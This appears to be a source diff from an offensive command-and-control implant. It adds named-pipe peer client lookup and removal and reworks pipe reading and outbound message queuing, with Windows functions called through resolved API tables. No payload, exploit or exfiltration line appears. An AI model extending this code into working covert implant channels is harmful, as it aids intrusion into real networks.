@@ -1,7 +1,67 @@
 #include <core/include/clients.hpp>
 namespace Clients {
 
-    BOOL AddClient(wchar_t *pipe_name) {
+    _client* GetClient(const uint32_t peer_id) {
+        HEXANE
+
+        auto head = Ctx->clients;
+        do {
+            if (head) {
+                if (head->peer_id == peer_id) {
+                    return head;
+                }
+                head = head->next;
+
+            } else {
+                return nullptr;
+            }
+        }
+        while (true);
+    }
+
+    BOOL RemoveClient(const uint32_t peer_id) {
+        HEXANE
+
+        _client *prev       = { };
+        _client *head       = Ctx->clients;
+        _client *target     = GetClient(peer_id);
+        bool success        = true;
+
+        if (!head || !target) {
+            success_(false);
+        }
+
+        while (head) {
+            if (head == target) {
+                if (prev) {
+                    prev->next = head->next;
+                } else {
+                    Ctx->clients = head->next;
+                }
+
+                if (head->pipe_name) {
+                    x_memset(head->pipe_name, 0, x_wcslen(head->pipe_name));
+                    x_free(head->pipe_name);
+                }
+
+                if (head->pipe_handle) {
+                    Ctx->nt.NtClose(head->pipe_handle);
+                    head->pipe_handle = nullptr;
+                }
+
+                head->peer_id = 0;
+                success_(true);
+            }
+
+            prev = head;
+            head = head->next;
+        }
+
+        defer:
+        return success;
+    }
+
+    BOOL AddClient(const wchar_t *pipe_name) {
         HEXANE
 
         _stream *in     = { };
@@ -21,7 +81,7 @@ namespace Clients {
                 success_(false);
             }
 
-            else if (ntstatus == ERROR_PIPE_BUSY) {
+            if (ntstatus == ERROR_PIPE_BUSY) {
                 if (!Ctx->win32.WaitNamedPipeW(pipe_name, 5000)) {
                     Ctx->nt.NtClose(handle);
                     success_(false);
@@ -71,8 +131,9 @@ namespace Clients {
                         head->next = client;
                         break;
                     }
+                } else {
+                    break;
                 }
-                else break;
             }
             while (true);
         }
@@ -93,32 +154,30 @@ namespace Clients {
             uint32_t total  = 0;
             uint32_t read   = 0;
 
+            if (!Ctx->win32.PeekNamedPipe(client->pipe_handle, &bound, sizeof(uint8_t), nullptr, R_CAST(LPDWORD, &read), nullptr) || read != sizeof(uint8_t)) {
+                continue;
+            }
             if (!Ctx->win32.PeekNamedPipe(client->pipe_handle, nullptr, 0, nullptr, R_CAST(LPDWORD, &total), nullptr)) {
                 continue;
             }
 
-            if (total >= sizeof(uint32_t)) {
-                if (!Ctx->win32.PeekNamedPipe(client->pipe_handle, &bound, sizeof(uint8_t), nullptr, nullptr, nullptr)) {
+            if (bound == 0 && total >= sizeof(uint32_t)) {
+                if (!(buffer = x_malloc(total)) || !(in = Stream::CreateStream())) {
+                    return_defer(ntstatus);
+                }
+
+                if (!Ctx->win32.ReadFile(client->pipe_handle, buffer, total, R_CAST(LPDWORD, &read), nullptr) || read != total) {
+                    Stream::DestroyStream(in);
+                    x_free(buffer);
+
                     continue;
                 }
 
-                if (bound == 0) {
-                    if (!(buffer = x_malloc(total)) || !(in = Stream::CreateStream())) {
-                        return_defer(ntstatus);
-                    }
+                in->buffer = buffer;
+                in->length += total;
 
-                    if (!Ctx->win32.ReadFile(client->pipe_handle, buffer, total, R_CAST(LPDWORD, &read), nullptr) || read != total) {
-                        Stream::DestroyStream(in);
-                        x_free(buffer);
+                Dispatcher::OutboundQueue(in);
 
-                        continue;
-                    }
-
-                    in->buffer = buffer;
-                    in->length += total;
-
-                    Dispatcher::OutboundQueue(in);
-                }
             } else {
                 continue;
             }
@@ -132,8 +191,6 @@ namespace Clients {
                             Dispatcher::RemoveMessage(message);
                         }
                     }
-                } else {
-                    continue;
                 }
             }
         }
